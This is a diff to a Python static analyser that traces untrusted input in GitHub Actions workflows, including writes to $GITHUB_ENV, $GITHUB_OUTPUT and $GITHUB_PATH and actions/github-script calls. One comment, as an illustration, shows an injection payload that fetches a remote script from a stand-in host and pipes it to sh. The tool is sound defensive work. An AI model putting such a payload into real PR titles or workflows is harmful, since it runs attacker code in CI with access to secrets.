@@ -42,6 +42,7 @@ from .expressions import (
 )
 from .model import Severity
 from .workflow import Step, Workflow, get, items, scalar
+from .writes import ENV, OUTPUT, PATH, assignments, github_script_calls, shell_writes
 
 # Context values an outsider controls: titles, bodies, branch names, commit messages...
 # Placed straight into a shell script, "a`; curl evil.sh | sh`" in a PR title runs as code.
@@ -135,14 +136,15 @@ class Scope:
         return None
 
 
-# A line of a script that appends to $GITHUB_ENV or $GITHUB_OUTPUT:
-#   echo "title=$TITLE" >> "$GITHUB_OUTPUT"     echo NAME=value >>$GITHUB_ENV
-_WRITE = re.compile(
-    r"""(?P<name>[A-Za-z_][\w-]*)=(?P<value>.*?)["']?\s*>>\s*["']?\$\{?GITHUB_(?P<file>OUTPUT|ENV)\b"""
-)
 _SHELL_VAR = re.compile(r"\$\{?([A-Za-z_]\w*)")
-# Any line appending to $GITHUB_ENV or $GITHUB_PATH, whatever comes before ">>" (WG007).
-_APPEND = re.compile(r""">>\s*["']?\$\{?GITHUB_(?P<file>ENV|PATH)\b""")
+# In github-script: the event payload (= github.event) and environment variables.
+_JS_PAYLOAD = re.compile(
+    r"""context\.payload(?P<rest>(?:\.[A-Za-z_]\w*|\[\s*(?:\d+|'[^']*'|"[^"]*")\s*\])+)"""
+)
+_JS_SEGMENT = re.compile(
+    r"""\.(?P<name>[A-Za-z_]\w*)|\[\s*(?:(?P<index>\d+)|'(?P<sq>[^']*)'|"(?P<dq>[^"]*)")\s*\]"""
+)
+_JS_ENV = re.compile(r"""process\.env(?:\.(?P<name>[A-Za-z_]\w*)|\[\s*['"](?P<key>[^'"]+)['"]\s*\])""")
 
 
 @dataclass(frozen=True)
@@ -154,6 +156,8 @@ class FileWrite:
     file: str
     """``ENV`` or ``PATH``."""
     taint: Taint
+    key: str = "run"
+    """Where the script is: ``run`` or ``script`` (actions/github-script's ``with.script``)."""
 
 
 @dataclass(frozen=True)
@@ -266,36 +270,74 @@ class Tracker:
             tracked.append(current)
             run = scalar(get(step.node, "run"))
             if run is not None:
-                self._record_writes(run, own, scope, step_id, label)
-                current.writes.extend(self._file_writes(run, own))
+                self._apply_shell_writes(run, own, scope, current, step_id, label)
+            script = scalar(get(get(step.node, "with"), "script"))
+            if script is not None and (step.uses or "").startswith("actions/github-script@"):
+                self._apply_script_calls(script, own, scope, current, step_id, label)
         return tracked, scope
 
-    def _record_writes(self, run: str, own: Scope, scope: Scope, step_id: str | None, label: str) -> None:
-        """``>> $GITHUB_ENV`` changes the job's env for later steps; ``>> $GITHUB_OUTPUT`` sets
-        this step's outputs. ``own`` is what the script sees, ``scope`` what later steps get."""
-        for line in run.splitlines():
-            if (match := _WRITE.search(line)) is None:
-                continue
-            name, taint = match["name"], self._taint_of_shell(match["value"], own)
-            if match["file"] == "ENV":
-                if taint is None:
-                    scope.env.pop(name, None)
-                else:
-                    scope.env[name] = taint.through(f"${name} written to $GITHUB_ENV in {label}")
-            elif step_id:
-                key = (step_id.lower(), name.lower())
-                if taint is None:
-                    scope.outputs.pop(key, None)
-                else:
-                    scope.outputs[key] = taint.through(f"steps.{step_id}.outputs.{name}")
+    def _apply_shell_writes(
+        self, run: str, own: Scope, scope: Scope, current: TrackedStep, step_id: str | None, label: str
+    ) -> None:
+        """What a ``run:`` script appends to $GITHUB_OUTPUT / $GITHUB_ENV / $GITHUB_PATH: outputs
+        and env for later steps, and (WG007) tainted text in $GITHUB_ENV / $GITHUB_PATH. ``own``
+        is what the script sees, ``scope`` what later steps get."""
+        for assignment in assignments(shell_writes(run)):
+            hit = next(
+                ((w, t) for w in assignment.writes if (t := self._taint_of_shell(w.source, own)) is not None),
+                None,
+            )
+            taint = hit[1] if hit else None
+            if hit is not None and assignment.file in (ENV, PATH):
+                current.writes.append(FileWrite(hit[0].line, assignment.file, hit[1]))
+            self._assign(assignment.file, assignment.name, taint, scope, step_id, label)
 
-    def _file_writes(self, run: str, own: Scope) -> Iterator[FileWrite]:
-        for index, line in enumerate(run.splitlines()):
-            if (match := _APPEND.search(line)) is None:
-                continue
-            # Everything before ">>": the echo/printf and what it writes.
-            if (taint := self._taint_of_shell(line[: match.start()], own)) is not None:
-                yield FileWrite(index, match["file"], taint)
+    def _apply_script_calls(
+        self, script: str, own: Scope, scope: Scope, current: TrackedStep, step_id: str | None, label: str
+    ) -> None:
+        """The same for ``core.setOutput`` / ``core.exportVariable`` / ``core.addPath``."""
+        for call in github_script_calls(script):
+            taint = self._taint_of_js(call.argument, own)
+            if taint is not None and call.file in (ENV, PATH):
+                current.writes.append(FileWrite(call.line, call.file, taint, key="script"))
+            self._assign(call.file, call.name, taint, scope, step_id, label)
+
+    @staticmethod
+    def _assign(
+        file: str, name: str | None, taint: Taint | None, scope: Scope, step_id: str | None, label: str
+    ) -> None:
+        if name is None:
+            return
+        if file == ENV:
+            if taint is None:
+                scope.env.pop(name, None)
+            else:
+                scope.env[name] = taint.through(f"${name} written to $GITHUB_ENV in {label}")
+        elif file == OUTPUT and step_id:
+            key = (step_id.lower(), name.lower())
+            if taint is None:
+                scope.outputs.pop(key, None)
+            else:
+                scope.outputs[key] = taint.through(f"steps.{step_id}.outputs.{name}")
+
+    def _taint_of_js(self, text: str, scope: Scope) -> Taint | None:
+        """A github-script value: ``${{ }}``, ``context.payload.*`` (that is ``github.event.*``)
+        and ``process.env.NAME``."""
+        if (taint := self._taint_of_text(text, scope)) is not None:
+            return taint
+        for match in _JS_PAYLOAD.finditer(text):
+            segments = ["github", "event"]
+            for seg in _JS_SEGMENT.finditer(match["rest"]):
+                if seg["index"] is not None:
+                    segments.append("*")
+                else:
+                    segments.append((seg["name"] or seg["sq"] or seg["dq"] or "").lower())
+            if (taint := direct_taint(ContextPath(tuple(segments), None), self.wf.is_action)) is not None:
+                return taint
+        for match in _JS_ENV.finditer(text):
+            if (taint := scope.env.get(match["name"] or match["key"])) is not None:
+                return taint
+        return None
 
 
 def _paths(expr: Expression) -> list[ContextPath]:
